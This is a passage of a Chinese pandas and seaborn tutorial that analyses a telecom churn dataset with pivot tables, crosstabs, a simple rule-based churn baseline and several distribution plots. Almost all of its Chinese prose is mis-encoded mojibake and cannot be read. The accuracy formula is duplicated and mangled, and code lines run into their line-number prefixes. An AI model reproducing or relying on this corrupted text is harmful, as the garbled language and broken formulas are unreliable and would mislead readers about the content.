¹æ®è¡Œå’Œåˆ—ä¸Šçš„åˆ†ç»„å°†æ•°æ®åˆ†é…åˆ°å„ä¸ªçŸ©å½¢åŒºåŸŸä¸­ã€‚ é€šè¿‡ pivot_table() æ–¹æ³•å¯ä»¥å»ºç«‹é€è§†è¡¨ï¼Œå…¶å‚æ•°å¦‚ä¸‹ï¼š values è¡¨ç¤ºéœ€è¦è®¡ç®—çš„ç»Ÿè®¡æ•°æ®çš„å˜é‡åˆ—è¡¨ index è¡¨ç¤ºåˆ†ç»„æ•°æ®çš„å˜é‡åˆ—è¡¨ aggfunc è¡¨ç¤ºéœ€è¦è®¡ç®—å“ªäº›ç»Ÿè®¡æ•°æ®ï¼Œä¾‹å¦‚ï¼Œæ€»å’Œã€å‡å€¼ã€æœ€å¤§å€¼ã€æœ€å°å€¼ç­‰ã€‚ ç°åœ¨ï¼Œé€šè¿‡ pivot_table() æ–¹æ³•æŸ¥çœ‹ä¸åŒåŒºå·ä¸‹ç™½å¤©ã€å¤œæ™šã€æ·±å¤œçš„ç”µè¯é‡çš„å‡å€¼ã€‚ 12df.pivot_table([&#x27;Total day calls&#x27;, &#x27;Total eve calls&#x27;, &#x27;Total night calls&#x27;], [&#x27;Area code&#x27;], aggfunc=&#x27;mean&#x27;) pivot_table() å…¶ä»–çš„ä½¿ç”¨æ–¹æ³•è§ Pandas ç™¾é¢˜å¤§å†²å…³ çš„é€è§†è¡¨éƒ¨åˆ†ã€‚ äº¤å‰è¡¨ï¼ˆCross Tabulationï¼‰æ˜¯ä¸€ç§ç”¨äºè®¡ç®—åˆ†ç»„é¢‘ç‡çš„ç‰¹æ®Šé€è§†è¡¨ï¼Œåœ¨ Pandas ä¸­ä¸€èˆ¬ä½¿ç”¨ crosstab() æ–¹æ³•æ„å»ºäº¤å‰è¡¨ã€‚ æ„å»ºä¸€ä¸ªäº¤å‰è¡¨æŸ¥çœ‹æ ·æœ¬çš„ Churn ç¦»ç½‘ç‡ å’Œ International plan å›½é™…å¥—é¤ çš„åˆ†å¸ƒæƒ…å†µã€‚ 1pd.crosstab(df[&#x27;Churn&#x27;], df[&#x27;International plan&#x27;]) æ„å»ºä¸€ä¸ªäº¤å‰è¡¨æŸ¥çœ‹ Churn ç¦»ç½‘ç‡ å’Œ Voice mail plan è¯­éŸ³é‚®ä»¶å¥—é¤ çš„åˆ†å¸ƒæƒ…å†µã€‚ 1pd.crosstab(df[&#x27;Churn&#x27;], df[&#x27;Voice mail plan&#x27;], normalize=True) ä¸Šè¿°ç»“æœè¡¨æ˜ï¼Œå¤§éƒ¨åˆ†ç”¨æˆ·æ˜¯å¿ å®ç”¨æˆ·ï¼ŒåŒæ—¶ä»–ä»¬å¹¶ä¸ä½¿ç”¨é¢å¤–çš„æœåŠ¡ï¼ˆå›½é™…å¥—é¤ã€è¯­éŸ³é‚®ä»¶ï¼‰ã€‚ å¢å‡ DataFrame çš„è¡Œåˆ— åœ¨ DataFrame ä¸­æ–°å¢åˆ—æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œæ¯”å¦‚ï¼Œä½¿ç”¨ insert()æ–¹æ³•æ·»åŠ åˆ—ï¼Œä¸ºæ‰€æœ‰ç”¨æˆ·è®¡ç®—æ€»çš„ Total calls ç”µè¯é‡ã€‚ 1234567total_calls = df[&#x27;Total day calls&#x27;] + df[&#x27;Total eve calls&#x27;] + \\ df[&#x27;Total night calls&#x27;] + df[&#x27;Total intl calls&#x27;]# loc å‚æ•°æ˜¯æ’å…¥ Series å¯¹è±¡åé€‰æ‹©çš„åˆ—æ•°# è®¾ç½®ä¸º len(df.columns)ä»¥ä¾¿å°†è®¡ç®—åçš„ Total calls ç²˜è´´åˆ°æœ€åä¸€åˆ—df.insert(loc=len(df.columns), column=&#x27;Total calls&#x27;, value=total_calls)df.head() ä¸Šé¢çš„ä»£ç åˆ›å»ºäº†ä¸€ä¸ªä¸­é—´ Series å®ä¾‹ï¼Œå³ total_callsï¼Œå…¶å®å¯ä»¥åœ¨ä¸åˆ›é€ è¿™ä¸ªå®ä¾‹çš„æƒ…å†µä¸‹ç›´æ¥æ·»åŠ åˆ—ã€‚ 1234df[&#x27;Total charge&#x27;] = df[&#x27;Total day charge&#x27;] + df[&#x27;Total eve charge&#x27;] + \\ df[&#x27;Total night charge&#x27;] + df[&#x27;Total intl charge&#x27;]df.head() ä½¿ç”¨ drop() æ–¹æ³•åˆ é™¤åˆ—å’Œè¡Œã€‚ 1234# ç§»é™¤å…ˆå‰åˆ›æ·çš„åˆ—df.drop([&#x27;Total charge&#x27;, &#x27;Total calls&#x27;], axis=1, inplace=True)# åˆ é™¤è¡Œdf.drop([1, 2]).head() å¯¹ä¸Šè¿°ä»£ç çš„éƒ¨åˆ†è§£é‡Šï¼š å°†ç›¸åº”çš„ç´¢å¼• ['Total charge', 'Total calls'] å’Œ axis å‚æ•°ï¼ˆ1 è¡¨ç¤ºåˆ é™¤åˆ—ï¼Œ0 è¡¨ç¤ºåˆ é™¤è¡Œï¼Œé»˜è®¤å€¼ä¸º 0ï¼‰ä¼ ç»™ dropã€‚ inplace å‚æ•°è¡¨ç¤ºæ˜¯å¦ä¿®æ”¹åŸå§‹ DataFrame ï¼ˆFalse è¡¨ç¤ºä¸ä¿®æ”¹ç°æœ‰ DataFrameï¼Œè¿”å›ä¸€ä¸ªæ–° DataFrameï¼ŒTrue è¡¨ç¤ºä¿®æ”¹å½“å‰ DataFrameï¼‰ã€‚ é¢„æµ‹ç¦»ç½‘ç‡ é¦–å…ˆï¼Œé€šè¿‡ä¸Šé¢ä»‹ç»çš„ crosstab() æ–¹æ³•æ„å»ºä¸€ä¸ªäº¤å‰è¡¨æ¥æŸ¥çœ‹ International plan å›½é™…å¥—é¤ å˜é‡å’Œ Churn ç¦»ç½‘ç‡ çš„ç›¸å…³æ€§ï¼ŒåŒæ—¶ä½¿ç”¨ countplot() æ–¹æ³•æ„å»ºè®¡æ•°ç›´æ–¹å›¾æ¥å¯è§†åŒ–ç»“æœã€‚ 12345# åŠ è½½æ¨¡å—ï¼Œé…ç½®ç»˜å›¾import matplotlib.pyplot as pltimport seaborn as snssns.countplot(x=&#x27;International plan&#x27;, hue=&#x27;Churn&#x27;, data=df) ä¸Šå›¾è¡¨æ˜ï¼Œå¼€é€šäº†å›½é™…å¥—é¤çš„ç”¨æˆ·çš„ç¦»ç½‘ç‡è¦é«˜å¾ˆå¤šï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆæœ‰è¶£çš„è§‚æµ‹ç»“æœã€‚ä¹Ÿè®¸ï¼Œå›½é™…ç”µè¯é«˜æ˜‚çš„è¯è´¹è®©å®¢æˆ·å¾ˆä¸æ»¡æ„ã€‚ åŒç†ï¼ŒæŸ¥çœ‹ Customer service calls å®¢æœå‘¼å« å˜é‡ä¸ Chunrn ç¦»ç½‘ç‡ çš„ç›¸å…³æ€§ï¼Œå¹¶å¯è§†åŒ–ç»“æœã€‚ 123pd.crosstab(df[&#x27;Churn&#x27;], df[&#x27;Customer service calls&#x27;], margins=True)sns.countplot(x=&#x27;Customer service calls&#x27;, hue=&#x27;Churn&#x27;, data=df) ä¸Šå›¾è¡¨æ˜ï¼Œåœ¨å®¢æœå‘¼å« 4 æ¬¡ä¹‹åï¼Œå®¢æˆ·çš„ç¦»ç½‘ç‡æ˜¾è‘—ä¸‹é™ã€‚ ä¸ºäº†æ›´å¥½çš„çªå‡º Customer service call å®¢æœå‘¼å« å’Œ Churn ç¦»ç½‘ç‡ çš„å…³ç³»ï¼Œå¯ä»¥ç»™ DataFrame æ·»åŠ ä¸€ä¸ªäºŒå…ƒå±æ€§ Many_service_callsï¼Œå³å®¢æˆ·å‘¼å«è¶…è¿‡ 3 æ¬¡ï¼ˆCustomer service calls &gt; 3ï¼‰ã€‚çœ‹ä¸‹å®ƒä¸ç¦»ç½‘ç‡çš„ç›¸å…³æ€§ï¼Œå¹¶å¯è§†åŒ–ç»“æœã€‚ 12345df[&#x27;Many_service_calls&#x27;] = (df[&#x27;Customer service calls&#x27;] &gt; 3).astype(&#x27;int&#x27;)pd.crosstab(df[&#x27;Many_service_calls&#x27;], df[&#x27;Churn&#x27;], margins=True)sns.countplot(x=&#x27;Many_service_calls&#x27;, hue=&#x27;Churn&#x27;, data=df) ç°åœ¨æˆ‘ä»¬å¯ä»¥åˆ›å»ºå¦ä¸€å¼ äº¤å‰è¡¨ï¼Œå°† Churn ç¦»ç½‘ç‡ ä¸ International plan å›½é™…å¥—é¤ åŠæ–°åˆ›å»ºçš„ Many_service_calls å¤šæ¬¡å®¢æœå‘¼å« å…³è”èµ·æ¥ã€‚ 1pd.crosstab(df[&#x27;Many_service_calls&#x27;] &amp; df[&#x27;International plan&#x27;], df[&#x27;Churn&#x27;]) ä¸Šè¡¨è¡¨æ˜ï¼Œåœ¨å®¢æœå‘¼å«æ¬¡æ•°è¶…è¿‡ 3 æ¬¡å¹¶ä¸”å·²åŠç† International Plan å›½é™…å¥—é¤ çš„æƒ…å†µä¸‹ï¼Œé¢„æµ‹ä¸€åå®¢æˆ·ä¸å¿ è¯šçš„å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰å¯ä»¥è¾¾åˆ° 85.8ï¼…ï¼Œè®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š å‡†ç¡®ç‡ï¼ˆğ´ğ‘ğ‘ğ‘¢ğ‘Ÿğ‘ğ‘ğ‘¦ï¼‰=ğ‘‡ğ‘ƒ+ğ‘‡ğ‘ğ‘‡ğ‘ƒ+ğ‘‡ğ‘+ğ¹ğ‘ƒ+ğ¹ğ‘=2841+192841+9+19+464Ã—100å‡†ç¡®ç‡ï¼ˆAccurac**yï¼‰=T**P+T**N+F**P+FNT**P+T**N=2841+9+19+4642841+19Ã—100 å…¶ä¸­ï¼ŒTP è¡¨ç¤ºå°† True é¢„æµ‹ä¸º True çš„æ•°é‡ï¼ŒTN è¡¨ç¤ºå°† Flase é¢„æµ‹ä¸º Flase çš„æ•°é‡ï¼ŒFP è¡¨ç¤ºå°† Flase é¢„æµ‹ä¸º True çš„æ•°é‡ï¼ŒFN è¡¨ç¤ºå°† True é¢„æµ‹ä¸º Flase çš„æ•°é‡ã€‚ å¤ä¹ ä¸€ä¸‹æœ¬æ¬¡å®éªŒçš„å†…å®¹ï¼š æ ·æœ¬ä¸­å¿ å®å®¢æˆ·çš„ä»½é¢ä¸º 85.5%ã€‚è¿™æ„å‘³ç€æœ€ç®€å•çš„é¢„æµ‹ã€Œå¿ å®å®¢æˆ·ã€çš„æ¨¡å‹æœ‰ 85.5% çš„æ¦‚ç‡çŒœå¯¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåç»­æ¨¡å‹çš„å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰ä¸åº”è¯¥æ¯”è¿™ä¸ªæ•°å­—å°‘ï¼Œå¹¶ä¸”å¾ˆæœ‰å¸Œæœ›æ˜¾è‘—é«˜äºè¿™ä¸ªæ•°å­—ã€‚ åŸºäºä¸€ä¸ªç®€å•çš„ã€Œï¼ˆå®¢æœå‘¼å«æ¬¡æ•° &gt; 3ï¼‰ &amp; ï¼ˆå›½é™…å¥—é¤ = Trueï¼‰ =&gt; Churn = 1, else Churn = 0ã€è§„åˆ™çš„é¢„æµ‹æ¨¡å‹ï¼Œå¯ä»¥å¾—åˆ° 85.8% çš„å‡†ç¡®ç‡ã€‚ä»¥åæˆ‘ä»¬å°†è®¨è®ºå†³ç­–æ ‘ï¼Œçœ‹çœ‹å¦‚ä½•ä»…ä»…åŸºäºè¾“å…¥æ•°æ®è‡ªåŠ¨æ‰¾å‡ºç±»ä¼¼çš„è§„åˆ™ï¼Œè€Œä¸éœ€è¦æˆ‘ä»¬æ‰‹å·¥è®¾å®šã€‚æˆ‘ä»¬æ²¡æœ‰åº”ç”¨æœºå™¨å­¦ä¹ æ–¹æ³•å°±å¾—åˆ°äº†ä¸¤ä¸ªå‡†ç¡®ç‡ï¼ˆ85.5% å’Œ 85.8%ï¼‰ï¼Œå®ƒä»¬å¯ä½œä¸ºåç»­å…¶ä»–æ¨¡å‹çš„åŸºçº¿ã€‚å¦‚æœç»è¿‡å¤§é‡çš„åŠªåŠ›ï¼Œæˆ‘ä»¬ä»…å°†å‡†ç¡®ç‡æé«˜äº† 0.5%ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŠªåŠ›çš„æ–¹å‘å¯èƒ½å‡ºç°äº†åå·®ï¼Œå› ä¸ºä»…ä»…ä½¿ç”¨ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªé™åˆ¶è§„åˆ™çš„ç®€å•æ¨¡å‹å°±å·²æå‡äº† 0.3% çš„å‡†ç¡®ç‡ã€‚ åœ¨è®­ç»ƒå¤æ‚æ¨¡å‹ä¹‹å‰ï¼Œå»ºè®®é¢„å¤„ç†ä¸€ä¸‹æ•°æ®ï¼Œç»˜åˆ¶ä¸€äº›å›¾è¡¨ï¼Œåšä¸€äº›ç®€å•çš„å‡è®¾ã€‚æ­¤å¤–ï¼Œåœ¨å®é™…ä»»åŠ¡ä¸Šåº”ç”¨æœºå™¨å­¦ä¹ æ—¶ï¼Œé€šå¸¸ä»ç®€å•çš„æ–¹æ¡ˆå¼€å§‹ï¼Œæ¥ç€å°è¯•æ›´å¤æ‚çš„æ–¹æ¡ˆã€‚ å®éªŒæ€»ç»“ æœ¬æ¬¡å®éªŒä½¿ç”¨ Pandas å¯¹æ•°æ®è¿›è¡Œäº†ä¸€å®šç¨‹åº¦çš„åˆ†æå’Œæ¢ç´¢ï¼Œäº¤å‰è¡¨ã€é€è§†è¡¨ç­‰æ–¹æ³•çš„è¿ç”¨å°†ä½¿ä½ åœ¨æ•°æ®æ¢ç´¢è¿‡ç¨‹ä¸­äº‹åŠåŠŸå€ã€‚ ç›¸å…³é“¾æ¥ Pandas å®˜æ–¹æ–‡æ¡£ 10 minutes to pandas Pandas cheatsheet PDF scipy-lectures.org æ•™ç¨‹ äº†è§£è“æ¡¥äº‘è¯¾ã€Šæ¥¼+ æœºå™¨å­¦ä¹ å’Œæ•°æ®æŒ–æ˜è¯¾ç¨‹ã€‹ Python æ•°æ®å¯è§†åŒ–åˆ†æ ä»‹ç» åœ¨æœºå™¨å­¦ä¹ é¢†åŸŸä¸­ï¼Œå¯è§†åŒ–æ˜¯ååˆ†é‡è¦çš„ã€‚åœ¨å¼€å§‹ä¸€é¡¹æ–°ä»»åŠ¡æ—¶ï¼Œé€šè¿‡å¯è§†åŒ–æ‰‹æ®µæ¢ç´¢æ•°æ®èƒ½æ›´å¥½åœ°å¸®åŠ©äººä»¬æŠŠæ¡æ•°æ®çš„è¦ç‚¹ã€‚åœ¨åˆ†ææ¨¡å‹è¡¨ç°å’Œæ¨¡å‹æŠ¥å‘Šçš„ç»“æœæ—¶ï¼Œå¯è§†åŒ–èƒ½ä½¿åˆ†ææ˜¾å¾—æ›´åŠ ç”ŸåŠ¨é²œæ˜ã€‚æœ‰æ—¶å€™ï¼Œä¸ºäº†ç†è§£å¤æ‚çš„æ¨¡å‹ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†é«˜ç»´ç©ºé—´æ˜ å°„ä¸ºè§†è§‰ä¸Šæ›´ç›´è§‚çš„äºŒç»´æˆ–ä¸‰ç»´å›¾å½¢ã€‚ æ€»è€Œè¨€ä¹‹ï¼Œå¯è§†åŒ–æ˜¯ä¸€ä¸ªç›¸å¯¹å¿«æ·çš„ä»æ•°æ®ä¸­æŒ–æ˜ä¿¡æ¯çš„æ‰‹æ®µã€‚æœ¬æ–‡å°†ä½¿ç”¨ Pandasã€Matplotlibã€seaborn ç­‰æµè¡Œçš„åº“ï¼Œå¸¦ä½ ä¸Šæ‰‹å¯è§†åŒ–ã€‚ çŸ¥è¯†ç‚¹ å•å˜é‡å¯è§†åŒ–çš„å¸¸ç”¨æ–¹æ³• å¤šå˜é‡å¯è§†åŒ–çš„å¸¸ç”¨æ–¹æ³• t-SNE æ•°æ®é›† é¦–å…ˆä½¿ç”¨ import è½½å…¥ç›¸å…³ä¾èµ–ã€‚ 1234567import warningsimport numpy as npimport pandas as pdimport matplotlib.pyplot as pltimport seaborn as snssns.set()warnings.filterwarnings(&#x27;ignore&#x27;) åœ¨ç¬¬ä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯æŸç”µä¿¡è¿è¥å•†çš„å®¢æˆ·ç¦»ç½‘æ•°æ®é›†ï¼Œæœ¬æ¬¡å®éªŒä»æ—§ä½¿ç”¨è¿™ä¸ªæ•°æ®é›†ã€‚ 1234df = pd.read_csv( &#x27;https://labfile.oss.aliyuncs.com/courses/1283/telecom_churn.csv&#x27;)df.head() æœ€åä¸€ä¸ªæ•°æ®åˆ— Churn ç¦»ç½‘ç‡ æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ç‰¹å¾ï¼Œå®ƒæ˜¯å¸ƒå°”å˜é‡ï¼Œå…¶ä¸­ True è¡¨ç¤ºå…¬å¸æœ€ç»ˆä¸¢å¤±äº†æ­¤å®¢æˆ·ï¼ŒFalse è¡¨ç¤ºå®¢æˆ·è¢«ä¿ç•™ã€‚ç¨åï¼Œå°†æ„å»ºåŸºäºå…¶ä»–ç‰¹å¾é¢„æµ‹ Churn ç‰¹å¾çš„æ¨¡å‹ã€‚ å•å˜é‡å¯è§†åŒ– å•å˜é‡ï¼ˆunivariateï¼‰åˆ†æä¸€æ¬¡åªå…³æ³¨ä¸€ä¸ªå˜é‡ã€‚å½“æˆ‘ä»¬ç‹¬ç«‹åœ°åˆ†æä¸€ä¸ªç‰¹å¾æ—¶ï¼Œé€šå¸¸æœ€å…³å¿ƒçš„æ˜¯è¯¥ç‰¹å¾å€¼çš„åˆ†å¸ƒæƒ…å†µã€‚ä¸‹é¢è€ƒè™‘ä¸åŒç»Ÿè®¡ç±»å‹çš„å˜é‡ï¼Œä»¥åŠç›¸åº”çš„å¯è§†åŒ–å·¥å…·ã€‚ æ•°é‡ç‰¹å¾ æ•°é‡ç‰¹å¾ï¼ˆquantitative featureï¼‰çš„å€¼ä¸ºæœ‰åºæ•°å€¼ã€‚è¿™äº›å€¼å¯èƒ½æ˜¯ç¦»æ•£çš„ï¼Œä¾‹å¦‚æ•´æ•°ï¼Œä¹Ÿå¯èƒ½æ˜¯è¿ç»­çš„ï¼Œä¾‹å¦‚å®æ•°ã€‚ ç›´æ–¹å›¾å’Œå¯†åº¦å›¾ ç›´æ–¹å›¾ä¾ç…§ç›¸ç­‰çš„é—´éš”å°†å€¼åˆ†ç»„ä¸ºæŸ±ï¼Œå®ƒçš„å½¢çŠ¶å¯èƒ½åŒ…å«äº†æ•°æ®åˆ†å¸ƒçš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚é«˜æ–¯åˆ†å¸ƒã€æŒ‡æ•°åˆ†å¸ƒç­‰ã€‚å½“åˆ†å¸ƒæ€»ä½“å‘ˆç°è§„å¾‹æ€§ï¼Œä½†æœ‰ä¸ªåˆ«å¼‚å¸¸å€¼æ—¶ï¼Œä½ å¯ä»¥é€šè¿‡ç›´æ–¹å›¾è¾¨è®¤å‡ºæ¥ã€‚å½“ä½ ä½¿ç”¨çš„æœºå™¨å­¦ä¹ æ–¹æ³•é¢„è®¾äº†æŸä¸€ç‰¹å®šåˆ†å¸ƒç±»å‹ï¼ˆé€šå¸¸æ˜¯é«˜æ–¯åˆ†å¸ƒï¼‰æ—¶ï¼ŒçŸ¥é“ç‰¹å¾å€¼çš„åˆ†å¸ƒæ˜¯éå¸¸é‡è¦çš„ã€‚ æœ€ç®€å•çš„æŸ¥çœ‹æ•°å€¼å˜é‡åˆ†å¸ƒçš„æ–¹æ³•æ˜¯ä½¿ç”¨ DataFrame çš„ hist() æ–¹æ³•ç»˜åˆ¶ç›´æ–¹å›¾ã€‚ 12features = [&#x27;Total day minutes&#x27;, &#x27;Total intl calls&#x27;]df[features].hist(figsize=(10, 4)) ä¸Šå›¾è¡¨æ˜ï¼Œå˜é‡ Total day minutes æ¯æ—¥é€šè¯æ—¶é•¿ å‘ˆé«˜æ–¯åˆ†å¸ƒï¼Œè€Œ Total intl calls æ€»å›½é™…å‘¼å«æ•° æ˜¾è‘—å³å€¾ï¼ˆå®ƒå³ä¾§çš„å°¾å·´æ›´é•¿ï¼‰ã€‚ å¯†åº¦å›¾ï¼ˆdensity plotsï¼‰ï¼Œä¹Ÿå«æ ¸å¯†åº¦å›¾ï¼ˆkernel density estimateï¼ŒKDEï¼‰æ˜¯ç†è§£æ•°å€¼å˜é‡åˆ†å¸ƒçš„å¦ä¸€ä¸ªæ–¹æ³•ã€‚å®ƒå¯ä»¥çœ‹æˆæ˜¯ç›´æ–¹å›¾å¹³æ»‘ï¼ˆsmoothedï¼‰çš„ç‰ˆæœ¬ã€‚ç›¸æ¯”ç›´æ–¹å›¾ï¼Œå®ƒçš„ä¸»è¦ä¼˜åŠ¿æ˜¯ä¸ä¾èµ–äºæŸ±çš„å°ºå¯¸ï¼Œæ›´åŠ æ¸…æ™°ã€‚ è®©æˆ‘ä»¬ä¸ºä¸Šé¢ä¸¤ä¸ªå˜é‡åˆ›å»ºå¯†åº¦å›¾ã€‚ 12df[features].plot(kind=&#x27;density&#x27;, subplots=True, layout=(1, 2), sharex=False, figsize=(10, 4), legend=False, title=features) å½“ç„¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ seaborn çš„ distplot() æ–¹æ³•è§‚æµ‹æ•°å€¼å˜é‡çš„åˆ†å¸ƒã€‚ä¾‹å¦‚ï¼ŒTotal day minutes æ¯æ—¥é€šè¯æ—¶é•¿ çš„åˆ†å¸ƒã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥æ–¹æ³•å°†åŒæ—¶æ˜¾ç¤ºç›´æ–¹å›¾å’Œå¯†åº¦å›¾ã€‚ 1sns.distplot(df[&#x27;Total intl calls&#x27;]) ä¸Šå›¾ä¸­ç›´æ–¹å›¾çš„æŸ±å½¢é«˜åº¦å·²è¿›è¡Œå½’ä¸€åŒ–å¤„ç†ï¼Œè¡¨ç¤ºçš„æ˜¯å¯†åº¦è€Œä¸æ˜¯æ ·æœ¬æ•°ã€‚ ç®±å‹å›¾ ç®±å½¢å›¾çš„ä¸»è¦ç»„æˆéƒ¨åˆ†æ˜¯ç®±å­ï¼ˆboxï¼‰ï¼Œé¡»ï¼ˆwhiskerï¼‰å’Œä¸€äº›å•ç‹¬çš„æ•°æ®ç‚¹ï¼ˆç¦»ç¾¤å€¼ï¼‰ï¼Œåˆ†åˆ«ç®€å•ä»‹ç»å¦‚ä¸‹ï¼š ç®±å­æ˜¾ç¤ºäº†åˆ†å¸ƒçš„å››åˆ†ä½è·ï¼Œå®ƒçš„é•¿åº¦ç”± 25ğ‘¡â„,ï¼ˆQ1ï¼Œä¸‹å››åˆ†ä½æ•°ï¼‰25t**h,ï¼ˆQ1ï¼Œä¸‹å››åˆ†ä½æ•°ï¼‰ å’Œ 75ğ‘¡â„,ï¼ˆQ3ï¼Œä¸Šå››åˆ†ä½æ•°ï¼‰75t**h,ï¼ˆQ3ï¼Œä¸Šå››åˆ†ä½æ•°ï¼‰ å†³å®šï¼Œç®±ä¸­çš„æ°´å¹³çº¿è¡¨ç¤ºä¸­ä½æ•° ï¼ˆ5050ï¼‰ã€‚ é¡»æ˜¯ä»ç®±å­å¤„å»¶ä¼¸å‡ºæ¥çš„çº¿ï¼Œå®ƒä»¬è¡¨ç¤ºæ•°æ®ç‚¹çš„æ€»ä½“æ•£å¸ƒï¼Œå…·ä½“è€Œè¨€ï¼Œæ˜¯ä½äºåŒºé—´ ï¼ˆQ1âˆ’1.5â‹…IQR,Q3+1.5â‹…IQRï¼‰ï¼ˆQ1âˆ’1.5â‹…IQR,Q3+1.5â‹…IQRï¼‰çš„æ•°æ®ç‚¹ï¼Œå…¶ä¸­ IQR=Q3âˆ’Q1IQR=Q3âˆ’Q1ï¼Œä¹Ÿå°±æ˜¯å››åˆ†ä½è·ã€‚ ç¦»ç¾¤å€¼æ˜¯é¡»ä¹‹å¤–çš„æ•°æ®ç‚¹ï¼Œå®ƒä»¬ä½œä¸ºå•ç‹¬çš„æ•°æ®ç‚¹ï¼Œæ²¿ç€ä¸­è½´ç»˜åˆ¶ã€‚ ä½¿ç”¨ seaborn çš„ boxplot() æ–¹æ³•ç»˜åˆ¶ç®±å½¢å›¾ã€‚ 1sns.boxplot(x=&#x27;Total intl calls&#x27;, data=df) ä¸Šå›¾è¡¨æ˜ï¼Œåœ¨è¯¥æ•°æ®é›†ä¸­ï¼Œå¤§é‡çš„å›½é™…å‘¼å«æ˜¯ç›¸å½“å°‘è§çš„ã€‚ æç´å½¢å›¾ æˆ‘ä»¬æœ€åè€ƒè™‘çš„åˆ†å¸ƒå›¾å½¢æ˜¯æç´å½¢å›¾ï¼ˆviolin plotï¼‰ã€‚æç´å½¢å›¾å’Œç®±å½¢å›¾çš„åŒºåˆ«æ˜¯ï¼Œæç´å½¢å›¾èšç„¦äºå¹³æ»‘åçš„æ•´ä½“åˆ†å¸ƒï¼Œè€Œç®±å½¢å›¾æ˜¾ç¤ºäº†å•ç‹¬æ ·æœ¬çš„ç‰¹å®šç»Ÿè®¡æ•°æ®ã€‚ ä½¿ç”¨ violinplot() æ–¹æ³•ç»˜åˆ¶æç´å½¢å›¾ã€‚ä¸‹å›¾å·¦ä¾§æ˜¯ç®±å½¢å›¾ï¼Œå³ä¾§æ˜¯æç´å½¢å›¾ã€‚ 123_, axes = plt.subplots(1, 2, sharey=True, figsize=(6, 4))sns.boxplot(data=df[&#x27;Total intl calls&#x27;], ax=axes[0])sns.violinplot(data=df[&#x27;Total intl calls&#x27;], ax=axes[1]) æ•°æ®æè¿° é™¤å›¾å½¢å·¥å…·å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ DataFrame çš„ describe() æ–¹æ³•æ¥è·å–åˆ†å¸ƒçš„ç²¾ç¡®æ•°å€¼ç»Ÿè®¡ã€‚ 1df[features].describe() describe() çš„è¾“å‡ºåŸºæœ¬ä¸Šæ˜¯è‡ªè§£é‡Šæ€§çš„ï¼Œ25%ï¼Œ50% å’Œ 75% æ˜¯ç›¸åº”çš„ç™¾åˆ†æ•°ã€‚ ç±»åˆ«ç‰¹å¾å’ŒäºŒå…ƒç‰¹å¾ ç±»åˆ«ç‰¹å¾ï¼ˆcategorical features takeï¼‰åæ˜ äº†æ ·æœ¬çš„æŸä¸ªå®šæ€§å±æ€§ï¼Œå®ƒå…·æœ‰å›ºå®šæ•°ç›®çš„å€¼ï¼Œæ¯ä¸ªå€¼å°†ä¸€ä¸ªè§‚æµ‹æ•°æ®åˆ†é…åˆ°ç›¸åº”çš„ç»„ï¼Œè¿™äº›ç»„ç§°ä¸ºç±»åˆ«ï¼ˆcategoryï¼‰ã€‚å¦‚æœç±»åˆ«å˜é‡çš„å€¼å…·æœ‰é¡ºåºï¼Œç§°ä¸ºæœ‰åºï¼ˆordinalï¼‰ç±»åˆ«å˜é‡ã€‚ äºŒå…ƒï¼ˆbinaryï¼‰ç‰¹å¾æ˜¯ç±»åˆ«ç‰¹å¾çš„ç‰¹ä¾‹ï¼Œå…¶å¯èƒ½å€¼æœ‰ 2 ä¸ªã€‚ é¢‘ç‡è¡¨ è®©æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ç›®æ ‡å˜é‡ Churn ç¦»ç½‘ç‡ çš„åˆ†å¸ƒæƒ…å†µã€‚é¦–å…ˆï¼Œä½¿ç”¨ value_counts() æ–¹æ³•å¾—åˆ°ä¸€å¼ é¢‘ç‡è¡¨ã€‚ 1df[&#x27;Churn&#x27;].value_counts() ä¸Šè¡¨æ˜¾ç¤ºï¼Œè¯¥æ•°æ®é›†çš„ Churn æœ‰ 2850 ä¸ªå±äº Falseï¼ˆChurn0ï¼‰ï¼Œæœ‰ 483 ä¸ªå±äº Trueï¼ˆChurn1ï¼‰ï¼Œæ•°æ®é›†ä¸­å¿ å®å®¢æˆ·ï¼ˆChurn0ï¼‰å’Œä¸å¿ å®å®¢æˆ·ï¼ˆChurn1ï¼‰çš„æ¯”ä¾‹å¹¶ä¸ç›¸ç­‰ã€‚æˆ‘ä»¬å°†åœ¨ä»¥åçš„æ–‡ç« ä¸­çœ‹åˆ°ï¼Œè¿™ç§æ•°æ®ä¸å¹³è¡¡çš„æƒ…å†µä¼šå¯¼è‡´å»ºç«‹çš„åˆ†ç±»æ¨¡å‹å­˜åœ¨ä¸€å®šçš„é—®é¢˜ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ„å»ºåˆ†ç±»æ¨¡å‹å¯èƒ½éœ€è¦åŠ é‡å¯¹ã€Œå°‘æ•°æ•°æ®ï¼ˆåœ¨è¿™é‡Œæ˜¯ Churn==1ï¼‰åˆ†ç±»é”™è¯¯ã€è¿™ä¸€æƒ…å†µçš„æƒ©ç½šã€‚ æ¡å½¢å›¾ é¢‘ç‡è¡¨çš„å›¾å½¢åŒ–è¡¨ç¤ºæ˜¯æ¡å½¢å›¾ã€‚åˆ›å»ºæ¡å½¢å›¾æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ seaborn çš„ countplot() å‡½æ•°ã€‚è®©æˆ‘ä»¬æ¥ç”»å‡ºä¸¤ä¸ªåˆ†ç±»å˜é‡çš„åˆ†å¸ƒã€‚ 1234_, axes = plt.subplots(nrows=1, ncols=2, figsize=(12, 4))sns.countplot(x=&#x27;Churn&#x27;, data=df, ax=axes[0])sns.countplot(x=&#x27;Customer service calls&#x27;, data=df, ax=axes[1]) 